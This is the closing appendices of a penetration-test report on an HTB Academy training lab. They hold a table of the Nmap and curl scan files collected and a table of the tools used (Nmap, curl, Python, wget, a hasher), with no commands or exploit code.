### APPENDIX F – SCAN INVENTORY

| Scan File | Type | Duration | Key Data |
| --------- | ---- | -------- | -------- |
| nmap_quick.nmap | Quick port scan | 0.83s | Open ports |
| nmap_vuln.nmap | Vulnerability scan | 35.83s | CVE enumeration |
| namp_http_enum.nmap | HTTP enumeration | 1831.98s | Web server details |
| nmap_ssh_enum.nmap | SSH enumeration | 612.38s | SSH algorithms, auth methods |
| nmap_svc_script.nmap | Service/script scan | 8.56s | Service versions |
| nmap_top_1000.nmap | Top 1000 ports | 7.78s | Port verification |
| curl.log | HTTP testing | N/A | Headers, file retrieval |
| nmap.log | Command history | N/A | Scan commands executed |

*[Source: All files in [scans/](scans/) directory]*

---

### APPENDIX G – TOOLS USED

| Tool | Version | Purpose |
| ---- | ------- | ------- |
| Nmap | 7.98 | Network reconnaissance and vulnerability scanning |
| curl | N/A | HTTP header and content retrieval |
| Python | 3.8.2 | Archive extraction on target |
| wget | N/A | File download on target |
| hasher | N/A | Hash generation (target-side utility) |

*[Source: Nmap version from scan headers; Python version from [tasks.md](tasks.md)]*

---

**END OF REPORT**

*Report generated: January 9, 2026*  
*Classification: HTB Academy Lab Assessment*
